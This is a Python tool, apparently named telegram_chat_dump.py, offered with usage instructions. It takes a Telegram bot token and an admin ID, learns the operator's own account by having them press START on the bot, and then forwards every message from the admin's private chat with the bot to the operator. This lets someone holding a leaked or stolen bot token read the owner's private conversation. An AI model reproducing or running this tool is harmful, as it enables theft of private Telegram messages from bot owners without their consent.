import telepot 
import json
import sys

def help():
    print("███─███─█───███─████─████─████─█───█─████─█──█─████─███")
    print("─█──█───█───█───█────█──█─█──█─██─██─█──█─█──█─█──█──█")
    print("─█──███─█───███─█─██─████─████─█─█─█─█────████─████──█")
    print("─█──█───█───█───█──█─█─█──█──█─█───█─█──█─█──█─█──█──█")
    print("─█──███─███─███─████─█─█──█──█─█───█─████─█──█─█──█──█")
    print("")
    print("████──█─█─█───█─████──█───████")
    print("█──██─█─█─██─██─█──█─██───█──█")
    print("█──██─█─█─█─█─█─████──█───█──█")
    print("█──██─█─█─█───█─█─────█───█──█")
    print("████──███─█───█─█─────█─█─████")
    print("Developed by @stranikk")
    print("Usage: python telegram_chat_dump.py [TOKEN] [AdminID]")
    print("Example: python telegram_chat_dump.py 123456789:AAAAAAAAaaaaaaa 987654321")

def main(TOKEN, ADMIN_ID):
    bot = telepot.Bot(TOKEN)

    try:
        print("Dumping secure chat...")
        info_chat = bot.getUpdates()

        jsons = str(info_chat[0])
        jsons = jsons.replace("False","false")
        jsons = jsons.replace("True","true")
        jsons = jsons.replace("'","\"")
        jsonData = json.loads(jsons)

        message = jsonData["message"]
        from_msg = message["from"]
        message_id = message["message_id"]
        chat_id = from_msg["id"]
        
        try:
            for id_mg in range(1,message_id):
                bot.forwardMessage(chat_id, ADMIN_ID, id_mg)
                
        except Exception:
            print("End dumping process. Thank you :)")
    
    except Exception:
        bot_name = str(bot.getMe())
        bot_name = bot_name.replace("'","\"")
        bot_name = bot_name.replace("False","false")
        bot_name = bot_name.replace("True","true")
        json_bot_name = json.loads(bot_name)
        value_bot_name = json_bot_name["username"]
        print("Name your chat Bot: ",value_bot_name)
        print("Please enter bot name in search Telegram Cliend and press button START")
    
if __name__ == "__main__":
    if len(sys.argv) == 3:
        main(str(sys.argv[1]), str(sys.argv[2]))
    else:
        help()